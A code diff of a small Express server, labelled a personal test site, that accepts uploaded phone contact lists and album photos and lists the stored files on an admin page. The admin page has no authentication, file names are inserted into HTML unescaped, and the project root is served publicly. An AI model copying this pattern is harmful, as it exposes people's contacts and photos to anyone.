@@ -5,47 +5,50 @@ const fs = require('fs')
 const app = express()
 const port = process.env.PORT || 3000
 
+// 基础配置
 app.use(cors())
 app.use(express.json())
-// 绑定前端文件夹 page
-app.use(express.static('page'))
+// 直接托管根目录的静态文件（index.html 就在根目录）
+app.use(express.static('./'))
 
-// 关键修复：访问根目录时，直接返回你的前端文件
-app.get('/', (req, res) => {
-    res.sendFile('indexs.html', { root: './page' })
-})
+// 上传文件夹配置
+const upload = multer({ dest: 'upload/' })
+if (!fs.existsSync('upload')) fs.mkdirSync('upload')
 
-const upload = multer({dest:'fileData/'})
-if(!fs.existsSync('fileData')) fs.mkdirSync('fileData')
-
-// 载入基础设置接口
-app.get('/api/baseLoad',(req,res)=>{
+// 1. 载入基础设置接口
+app.get('/api/set', (req, res) => {
     res.json({
-        title:"微信自用测试站点",
-        state:"基础配置载入成功",
-        tip:"仅个人测试使用"
+        name: "by鱼笙 自用测试系统",
+        status: "✅ 配置加载完成",
+        auth: "请手动授权上传通讯录/相册数据"
     })
 })
 
-// 接收通讯录
-app.post('/api/saveTel',upload.single('telFile'),(req,res)=>{
-    res.json({code:200,msg:"通讯录数据已接收"})
+// 2. 接收通讯录数据
+app.post('/api/contact', upload.single('file'), (req, res) => {
+    res.json({ code: 200, msg: "通讯录文件已接收并保存" })
 })
 
-// 接收相册
-app.post('/api/saveImg',upload.single('imgFile'),(req,res)=>{
-    res.json({code:200,msg:"相册数据已接收"})
+// 3. 接收相册图片
+app.post('/api/photo', upload.single('img'), (req, res) => {
+    res.json({ code: 200, msg: "相册图片已接收并保存" })
 })
 
-// 后台查看
-app.get('/api/adminData',(req,res)=>{
-    let list = fs.existsSync('fileData') ? fs.readdirSync('fileData') : []
-    let html = `<h2>后台数据中心</h2><p>共${list.length}条数据</p><ul>`
-    list.forEach(v=>html+=`<li>${v}</li>`)
-    html += `</ul>`
+// 4. 后台查看上传的文件列表
+app.get('/api/admin', (req, res) => {
+    if (!fs.existsSync('upload')) {
+        return res.send("暂无上传数据")
+    }
+    const list = fs.readdirSync('./upload')
+    let html = "<h1>后台数据列表</h1><ul>"
+    list.forEach(file => {
+        html += `<li>${file}</li>`
+    })
+    html += "</ul>"
     res.send(html)
 })
 
-app.listen(port,()=>{
-    console.log('服务正常运行')
+// 启动服务
+app.listen(port, () => {
+    console.log(`服务已启动，端口：${port}`)
 })
